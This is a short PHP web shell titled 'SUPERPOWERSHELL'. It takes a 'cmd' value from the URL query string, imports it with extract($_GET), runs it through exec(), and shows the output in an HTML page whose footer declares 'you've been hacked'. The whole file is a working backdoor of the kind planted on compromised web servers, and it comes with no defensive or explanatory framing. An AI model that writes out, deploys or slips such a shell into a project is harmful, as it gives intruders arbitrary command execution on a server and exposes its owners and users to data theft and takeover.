<?php
    extract($_GET);
    $cmd = $cmd ? $cmd : "ls ~/";
    $output = [];
    $result_code = null;
    exec($cmd, $output,$result_code);
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SUPERPOWERSHELL By X</title>
</head>
<body>
    <style>
        body{
            margin:0;
            padding:0;
            width:100vw;
            min-height:100vh;
        }
    </style>
    <section id='shell'>
        <h2 id='shelltitle'>
            <?php echo "resultats de la commande $cmd" ?>
        </h2>
        <div id='shelldata'>
            <div id='data'>
                <?php
                    foreach($output as $k => $line){
                        ?>
                            <div class="line">
                                <span class='number'>
                                    <?php
                                        echo $k+1;                                
                                    ?>
                                </span>
                                <span class='content'>
                                    <?php
                                        echo $line;                                
                                    ?>
                                </span>
                            </div>
                        <?php
                    }
                ?>
            </div>
            <div id='result_code'>
                <?php
                    echo $result_code;
                ?>
            </div>
        </div>
        <div id='shellfooter'>
            copyrights dev0ps221 2022 - you've been hacked !!!
        </div>
    </section>
    
</body>
</html>